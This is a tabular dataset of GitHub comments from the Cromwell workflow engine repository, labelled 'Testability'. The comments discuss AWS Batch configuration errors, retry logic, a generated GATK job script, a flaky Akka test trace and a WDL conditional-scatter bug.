Testability,"Also, please make sure wherever you specify the runtime-attributes; ""docker"", ""memory"" etc, you include ""disks"" also. Example:; ""default_runtime_attributes"": {; ""docker"": ""ubuntu:latest"",; ""memory"": ""21G"",; ""disks"" : ""/mnt/efs 3 EFS""; }; The size,3 , in this case does not matter. It gets ignored. On Fri, Feb 14, 2020 at 9:45 AM Vanaja Narayanaswamy <vanajasmy@gmail.com>; wrote:. > Can you upload the complete stack trace from the cromwell-log?; >; > On Fri, Feb 14, 2020 at 9:29 AM pjongeneel <notifications@github.com>; > wrote:; >; >> I have /mnt/efs on both batch nodes and cromwell server which is the; >> mounted EFS.; >>; >> Then; >> backend {; >> // this configures the AWS Batch Backend for Cromwell; >> default = ""AWSBATCH""; >> providers {; >> AWSBATCH {; >> actor-factory =; >> ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; >> config {; >> root = ""/mnt/efs/cromwell_execution""; >> auth = ""default""; >>; >> numSubmitAttempts = 3; >> numCreateDefinitionAttempts = 3; >>; >> default-runtime-attributes {; >> queueArn: ""${BatchQueue}""; >> }; >>; >> filesystems {; >> local { auth = ""default"" }; >> }; >> }; >> }; >>; >> }; >> }; >>; >> And I always get this error:; >> ERROR - AwsBatchAsyncBackendJobExecutionActor; >> [UUID(8512304b)bioinfx.testjob:NA:1]: Error attempting to Execute; >> java.util.NoSuchElementException: None.get; >>; >> —; >> You are receiving this because you were mentioned.; >> Reply to this email directly, view it on GitHub; >> <https://github.com/broadinstitute/cromwell/pull/5070?email_source=notifications&email_token=ALILATR2AVXQXLFRQKER6W3RC3IIXA5CNFSM4IBORPI2YY3PNVWWK3TUL52HS4DFVREXG43VMVBW63LNMVXHJKTDN5WW2ZLOORPWSZGOELZZF7A#issuecomment-586388220>,; >> or unsubscribe; >> <https://github.com/notifications/unsubscribe-auth/ALILATWPGUN66MUEOCVPYULRC3IIXANCNFSM4IBORPIQ>; >> .; >>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586416147:442,log,log,442,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586416147,2,"['log', 'test']","['log', 'testjob']"
Testability,"Also, regardless of where things stand, this will *not* be part of the upcoming release. I want to give downstream users a chance to more thoroughly vet this in case there are subtle changes not picked up by our testing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2380#issuecomment-311174731:212,test,testing,212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2380#issuecomment-311174731,1,['test'],['testing']
Testability,"Also, since this is resurrecting a feature we haven't used for a while, have we actually got any tests for this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/377#issuecomment-171666354:97,test,tests,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/377#issuecomment-171666354,1,['test'],['tests']
Testability,"Also, the shrink-wrapped releases never had any additional testing done compared to the daily snapshots; the daily system works for us because we have a TON of tests on every PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959979057:59,test,testing,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959979057,2,['test'],"['testing', 'tests']"
Testability,Also... why aren't the tests running on this PR?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/283#issuecomment-155471225:23,test,tests,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/283#issuecomment-155471225,1,['test'],['tests']
Testability,Am testing these manually on our `fc-jenkins` system,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5196#issuecomment-535638146:3,test,testing,3,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5196#issuecomment-535638146,1,['test'],['testing']
Testability,"And here is a different exception that should not retry (CommandException:; No URLs matched:; gs://broad-dsde-methods/testdata/crsp-public-bamsSM-74NEG.bam\nCommandException:; 1 file/object could not be transferred.\n)... Basically, the gs url was bad; -- no need to retry:. operations/EJfO9NChKxj-8IKPzZCav5kBIJ-XkZe9BioPcHJvZHVjdGlvblF1ZXVl. On Tue, Feb 7, 2017 at 3:06 PM, Lee Lichtenstein <; lichtens@broadinstitute.org> wrote:. > Here are a couple of operations IDs:; >; > operations/EKXs9cihKxitjp-C9L64yu8BIJ-XkZe9BioPcHJvZHVjdGlvblF1ZXVl; >; > operations/ENflycmhKxi6nric87SH0VUgn5eRl70GKg9wcm9kdWN0aW9uUXVldWU; >; >; >; > On Tue, Feb 7, 2017 at 2:56 PM, Jeff Gentry <notifications@github.com>; > wrote:; >; >> Discussed in person, this is a JES thing and @LeeTL1220; >> <https://github.com/LeeTL1220> is joining our call w/ them.; >>; >> —; >> You are receiving this because you were mentioned.; >> Reply to this email directly, view it on GitHub; >> <https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278121257>,; >> or mute the thread; >> <https://github.com/notifications/unsubscribe-auth/ACDXkz_R2EPm8L_Cf0qsEuETVTXhXQqgks5raMxvgaJpZM4L50dE>; >> .; >>; >; >; >; > --; > Lee Lichtenstein; > Broad Institute; > 75 Ames Street, Room 7003EB; > Cambridge, MA 02142; > 617 714 8632 <(617)%20714-8632>; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278124726:118,test,testdata,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278124726,1,['test'],['testdata']
Testability,And only exec.sh is present in the bucket (no log etc)....; ```#!/bin/bash; tmpDir=$(mktemp -d /cromwell_root/tmp.XXXXXX); chmod 777 $tmpDir; export _JAVA_OPTIONS=-Djava.io.tmpdir=$tmpDir; export TMPDIR=$tmpDir. (; cd /cromwell_root; java -Xmx4g -jar /cromwell_root/broad-dsde-methods/lichtens/test_cnv_validation/gatk.jar ModelSegments \; --denoisedCopyRatios /cromwell_root/broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/CNVValidation/6246d2fa-a8e5-49c0-ac38-8ae33867f394/call-cnvPair/CNVSomaticPairWorkflow/c8a063ce-0309-45a1-a6cf-25fdcfe4245c/call-DenoiseReadCountsNormal/G25783.TCGA-55-6986-11A-01D-1945-08.2.denoisedCR.tsv \; --allelicCounts /cromwell_root/broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/CNVValidation/6246d2fa-a8e5-49c0-ac38-8ae33867f394/call-cnvPair/CNVSomaticPairWorkflow/c8a063ce-0309-45a1-a6cf-25fdcfe4245c/call-CollectAllelicCountsNormal/attempt-3/G25783.TCGA-55-6986-11A-01D-1945-08.2.allelicCounts.tsv \; \; --maxNumSegmentsPerChromosome 500 \; --minTotalAlleleCount 30 \; --genotypingHomozygousLogRatioThreshold -10.0 \; --genotypingBaseErrorRate 0.05 \; --kernelVarianceCopyRatio 0.0 \; --kernelVarianceAlleleFraction 0.01 \; --kernelScalingAlleleFraction 1.0 \; --kernelApproximationDimension 100 \; --windowSize 8 --windowSize 16 --windowSize 32 --windowSize 64 --windowSize 128 --windowSize 256 \; --numChangepointsPenaltyFactor 1.0 \; --minorAlleleFractionPriorAlpha 25.0 \; --numSamplesCopyRatio 100 \; --numBurnInCopyRatio 50 \; --numSamplesAlleleFraction 100 \; --numBurnInAlleleFraction 50 \; --smoothingThresholdCopyRatio 2.0 \; --smoothingThresholdAlleleFraction 2.0 \; --maxNumSmoothingIterations 10 \; --numSmoothingIterationsPerFit 0 \; --output . \; --outputPrefix G25783.TCGA-55-6986-11A-01D-1945-08.2; ); echo $? > /cromwell_root/ModelSegmentsNormal-rc.txt.tmp; (; cd /cromwell_root. ); sync; mv /cromwell_root/ModelSegmentsNormal-rc.txt.tmp /cromwell_root/ModelSegmentsNormal-rc.txt```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2791#issuecomment-342955580:46,log,log,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2791#issuecomment-342955580,3,"['log', 'test']","['log', 'test-dl-oxoq-full']"
Testability,And we should definitely have a test for this,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1765#issuecomment-266867284:32,test,test,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1765#issuecomment-266867284,1,['test'],['test']
Testability,"Another error w/ this test:. https://fc-jenkins.dsp-techops.broadinstitute.org/view/Testing/view/Test%20Runners/job/cromwell-test-runner/2444/testReport/junit/cromwell.core.actor/RobustClientHelperSpec/RobustClientHelper_should_reset_timeout_when_backpressured_is_received/. ```; java.lang.AssertionError: assertion failed: received unexpected message RealMessage(ServiceUnreachable,TestActor[akka://TestSystem-78f39f37-cc73-481d-8e7a-e59e623aa020/user/$$i]) after 0 millis; at akka.testkit.TestKitBase.expectNoMsg_internal(TestKit.scala:696); at akka.testkit.TestKitBase.expectNoMessage(TestKit.scala:661); at akka.testkit.TestKitBase.expectNoMessage$(TestKit.scala:660); at akka.testkit.TestKit.expectNoMessage(TestKit.scala:896); at cromwell.core.actor.RobustClientHelperSpec.$anonfun$new$7(RobustClientHelperSpec.scala:140); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1682); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.core.actor.RobustClientHelperSpec.withFixture(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.invokeWithFixture$1(FlatSpecLike.scala:1680); at org.scalatest.FlatSpecLike.$anonfun$runTest$1(FlatSpecLike.scala:1692); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.FlatSpecLike.runTest(FlatSpecLike.scala:1692); at org.scalatest.FlatSpecLike.runTest$(FlatSpecLike.scala:1674); at cromwell.core.actor.RobustClientHelperSpec.runTest(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.$anonfun$runTests$1(FlatSpecLike.scala:1750); at org.scalates",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-451186054:22,test,test,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-451186054,21,"['Assert', 'Test', 'assert', 'test']","['AssertionError', 'Test', 'TestActor', 'TestKit', 'TestKitBase', 'TestSystem-', 'Testing', 'assertion', 'test', 'test-runner', 'testReport', 'testkit']"
Testability,"Another if-scatter bug.; i built a new `cromwell-31-d716fd2-SNAP.jar` from your `develop` branch.; ```; workflow test {; 	Boolean b0 = true; 	Boolean b1 = true; 	Boolean b2 = true; 	scatter( i in range(3) ) {; 		if ( b0 ) {; 			call t0 as t1 { input: i=i }; 		}; 	}; 	if ( b1 ) {; 		scatter( i in range(3) ) {; 			call t0 as t2 { input: i=t1.out[i] }; 		}; 	}; 	if ( b1 && b2 ) {; 		scatter( i in range(3) ) {; 			call t0 as t3 { input: i=t2.out[i] }; 		}; 	}; }. task t0 {; 	Int? i; 	command {; 		echo ${i}; 	}; 	output {; 		Int out = read_int(stdout()); 	}; }; ```; error log; ```; $ java -jar /users/leepc12/code/cromwell/./target/scala-2.12/cromwell-31-d716fd2-SNAP.jar run test_conditionals_in_cromwell-30.wdl; Picked up _JAVA_OPTIONS: -Xms256M -Xmx1024M -XX:ParallelGCThreads=1; [2017-12-05 20:11:15,13] [info] Running with database db.url = jdbc:hsqldb:mem:7e58cfd2-b9b6-47f9-bda1-6fe045e7a665;shutdown=false;hsqldb.tx=mvcc; [2017-12-05 20:11:21,83] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2017-12-05 20:11:21,84] [info] [RenameWorkflowOptionsInMetadata] 100%; [2017-12-05 20:11:22,02] [info] Running with database db.url = jdbc:hsqldb:mem:e02f9206-cb15-468a-929a-82676a83a9b8;shutdown=false;hsqldb.tx=mvcc; [2017-12-05 20:11:22,47] [info] Slf4jLogger started; [2017-12-05 20:11:22,67] [info] Metadata summary refreshing every 2 seconds.; [2017-12-05 20:11:22,68] [info] Starting health monitor with the following checks: DockerHub, Engine Database; [2017-12-05 20:11:22,69] [info] WriteMetadataActor configured to write to the database with batch size 200 and flush rate 5 seconds.; [2017-12-05 20:11:22,71] [info] CallCacheWriteActor configured to write to the database with batch size 100 and flush rate 3 seconds.; [2017-12-05 20:11:23,78] [info] SingleWorkflowRunnerActor: Submitting workflow; [2017-12-05 20:11:23,82] [info] Workflow 159210e6-fa6a-4a99-b386-5931ae245324 submitted.; [2017-12-05 20:11:23",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2992#issuecomment-349527406:113,test,test,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2992#issuecomment-349527406,2,"['log', 'test']","['log', 'test']"
Testability,"Another issue for the [Log spec](https://docs.google.com/document/d/1Dc37EaPDoWXacSSzLgCdndx9zo5k6EmE5tvg-2fisPo/edit#). As a **user on the CLI and single workflow mode**, I want **to easily see the output location**, so that I can **check the status of my jobs while they are still completing**.; - Effort: **TBD** @geoffjentry ; - Risk: **TBD** @geoffjentry ; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1614#issuecomment-325478495:23,Log,Log,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1614#issuecomment-325478495,1,['Log'],['Log']
Testability,Another thing I've noticed is that a ton of our log messages are at debug level but most people aren't using debug level logging. Oopsie Daisy,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/778#issuecomment-225260047:48,log,log,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/778#issuecomment-225260047,2,['log'],"['log', 'logging']"
Testability,"Another vote for prioritized testing, though the increase in test coverage wouldn't automatically be reflected here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/386#issuecomment-172087798:29,test,testing,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/386#issuecomment-172087798,2,['test'],"['test', 'testing']"
